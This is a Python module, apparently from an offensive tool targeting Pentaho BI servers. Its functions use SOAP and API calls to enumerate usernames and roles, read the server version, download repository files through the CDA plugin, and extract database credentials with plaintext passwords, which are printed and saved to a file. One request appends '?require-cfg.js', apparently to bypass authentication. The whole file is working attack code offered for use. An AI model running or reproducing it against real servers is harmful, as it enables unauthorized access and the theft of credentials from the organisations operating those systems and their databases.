#!/usr/bin/python3
from modules import config
from colorama import Fore
from colorama import init
from pathlib import Path
import traceback
import xml.etree.ElementTree as ET
from tabulate import tabulate

# Colorama
init(autoreset=True)

"""

Put together all calls that extract info from a single endpoint

"""


def usernames():
	"""
	Anon trying to get usernames will fail via SOAP and get false results via API, so we check login status before everything
	"""
	user_list = []
	
	if config.is_anon:
		return
	try:
		soap_call = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getAllUsers xmlns="http://ws.userrole.security.platform.pentaho.org/"/></Body></Envelope>'
		response = config.session.post(f"{config.pentaho_path}/webservices/userRoleListService", data=soap_call, proxies=config.proxies)
		root = ET.fromstring(response.text)
		
		# Need an index otherwise tabulate does not work
		i=0;
		for uname in root.iter('return'):
			user_list.append([i, uname.text])
			i+=1
				
	except Exception as fail:
		print (fail)
		tb = traceback.format_exc()
		print (tb)
		#Falling back to API method
		resp = config.session.get(f"{config.pentaho_path}/api/userrolelist/users?require-cfg.js", proxies=config.proxies)
		if resp.status_code == 200:
			root = ET.fromstring(resp.text)
			i=0;
			for uname in root.iter('users'):
				user_list.append([i, uname.text])
				i+=1
	print (tabulate(user_list, headers=[' ', 'Usernames']))

def userroles():
	if config.is_anon:
		return
	response = config.session.get(f"{config.pentaho_path}/ServiceAction?action=SecurityDetails", proxies=config.proxies)
	root = ET.fromstring(response.text)
	print ('Users:')
	for uname in root.iter('user'):
		print (uname.text)
	print ('---')
	print ('Roles:')
	for role in root.iter('role'):
		print (role.text)

def version():
	response = config.session.get(f"{config.pentaho_path}/api/version/show?require-cfg.js", proxies=config.proxies)
	print(response.text)

def db_credentials():
	if config.is_anon:
		return
	databases_list = []

	soap_call = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getDatasources xmlns="http://webservices.repository.platform.pentaho.org/"/></Body></Envelope>'
	response = config.session.post(f"{config.pentaho_path}/webservices/datasourceMgmtService", data=soap_call, proxies=config.proxies)
	#print (response.text)
	root = ET.fromstring(response.text)
	for database_info in root.iter('return'):
		databases_list.append([database_info.find('databaseName').text, database_info.find('databaseType').text, database_info.find('hostname').text, database_info.find('databasePort').text, database_info.find('username').text, database_info.find('password').text, database_info.find('name').text])
		
	print (tabulate(databases_list, headers=['Name', 'Type', 'Hostname', 'Port', 'Username', 'Password', 'Alias']))
	
	# saving the data to a file
	f=open(f'{config.dirname}/databases.txt', 'w+')
	f.write(response.text)
	f.close()
	
def repository_file_download(file):
	if config.is_anon:
		return
	# Creating path
	file_path = file[:file.rfind('/')]
	file_name = file[file.rfind('/'):]
	
	
	Path(f'{config.dirname}/repository/files/{file_path}').mkdir(parents=True, exist_ok=True)
	
	response = config.session.get(f"{config.pentaho_path}/plugin/cda/api/getCdaFile?path={file}", proxies=config.proxies)
	print(response.text)
	
	# saving the application.wadl file
	f=open(f'{config.dirname}/repository/files/{file_path}/{file_name}', 'w+')
	f.write(response.text)
	f.close()